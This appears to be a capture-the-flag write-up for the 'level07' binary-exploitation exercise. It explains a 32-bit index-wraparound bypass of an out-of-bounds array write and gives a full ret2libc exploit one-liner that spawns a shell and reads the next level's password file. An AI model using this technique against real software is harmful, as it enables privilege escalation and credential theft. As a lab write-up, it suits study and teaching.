# level07

## Objective

Use the number-storage service's unchecked index to replace `main`'s saved
return address with a ret2libc call to `system("/bin/sh")`, then read
`/home/users/level08/.pass`.

## Vulnerability

The service maintains a local array of 100 unsigned integers. Its `store`
command performs this write without checking whether the index is in range:

```c
numbers[index] = value;
```

It rejects indices divisible by three and values whose most-significant byte is
`0xb7`:

```c
if (index % 3 == 0 || (value >> 24) == 0xb7)
    return (1);
```

The index multiplication is a 32-bit operation. An index can wrap around and
address a stack slot near the array without being divisible by three.

## Return address index

At the beginning of `main`, GDB measured the distance from `numbers[0]` to the
saved return address:

```gdb
p/d (($ebp + 4) - ($esp + 0x24)) / 4
$1 = 114
```

Index `114` is blocked because `114 % 3 == 0`. Add $2^{30}$ instead:

```text
114 + 2^30 = 1073741938
```

The store expression multiplies this index by four in 32 bits. Therefore:

$$
4 \times (114 + 2^{30}) \equiv 4 \times 114 \pmod{2^{32}}
$$

`1073741938 % 3` is nonzero, so this wrapped index writes to the same saved
return-address location while passing the filter.

## Ret2libc values

ASLR is disabled on the supplied VM. Previously observed libc values are:

```text
system:  0xf7e6aed0 = 4159090384
exit:    0xf7e5eb70 = 4159040368
/bin/sh: 0xf7f897ec = 4160264172
```

Store these three words at the saved return address and the following two
words: `system`, `exit`, then the libc `/bin/sh` pointer.

## Exploit

Run:

```sh
(python -c 'print "store"; print "4159090384"; print "1073741938"; print "store"; print "4159040368"; print "115"; print "store"; print "4160264172"; print "116"; print "quit"'; cat) | ./level07
```

The first store wraps to index 114 and overwrites the saved return address.
The next two stores provide the return address for `system` and its argument.
`quit` lets `main` return into the chain; the trailing `cat` keeps the shell
interactive.

Verify the effective identity and read the next password:

```sh
id
cat /home/users/level08/.pass
```

Observed identity:

```text
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users)
```

The recovered password is recorded in `flag`.